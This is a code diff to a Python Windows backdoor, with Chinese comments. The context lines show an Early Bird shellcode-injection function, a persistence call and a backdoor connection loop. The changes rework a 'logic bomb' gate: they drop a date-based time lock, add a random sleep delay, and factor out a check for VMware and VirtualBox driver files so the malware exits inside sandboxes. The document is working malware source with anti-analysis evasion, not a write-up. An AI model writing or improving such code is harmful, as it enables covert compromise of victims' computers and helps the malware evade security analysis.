@@ -151,24 +151,28 @@ def early_bird_injection(shellcode_b64, target_exe="C:\\Windows\\System32\\notep
     except Exception as e:
         return f"[!!] Early Bird Injection failed: {str(e)}"
 
+def is_sandbox():
+    """檢測是否處於沙箱或虛擬機環境"""
+    sandbox_indicators = [
+        "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
+        "C:\\windows\\System32\\Drivers\\VboxMouse.sys",
+        "C:\\windows\\System32\\Drivers\\vmtoolsd.exe"
+    ]
+    return any(os.path.exists(path) for path in sandbox_indicators)
+
 def logic_bomb():
     """
     邏輯炸彈 (Logic Bomb)：
     檢查特定條件是否滿足。若條件不滿足，則拒絕執行後續的後門連線。
     """
-    # 1. 時間鎖：必須在 2026-05-21 00:00:00 UTC 之後執行 (timestamp: 1779340800)
-    target_time = 1779340800
-    if time.time() < target_time:
-        return False
+    import random
+    delay = random.randint(5, 10)
+    time.sleep(delay)
 
     # 2. 簡單沙箱防禦檢測：若檢測到常見虛擬機/沙箱驅動或路徑，則不執行
-    sandbox_files = [
-        "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
-        "C:\\windows\\System32\\Drivers\\VboxMouse.sys",
-    ]
-    for file in sandbox_files:
-        if os.path.exists(file):
-            return False
+    if is_sandbox():
+        # print("[!!] Sandbox environment detected. Exiting.")
+        return False
 
     return True
 
@@ -346,13 +350,9 @@ def connection():
             continue
 
 if __name__ == "__main__":
-
-    # 執行邏輯炸彈條件檢查，如果不通過則退出
+    
     if not logic_bomb():
         sys.exit(0)
-    
-    # 在進入主迴圈前嘗試執行持久化
+
     persist()
-    
-    # 開始連線
     connection()
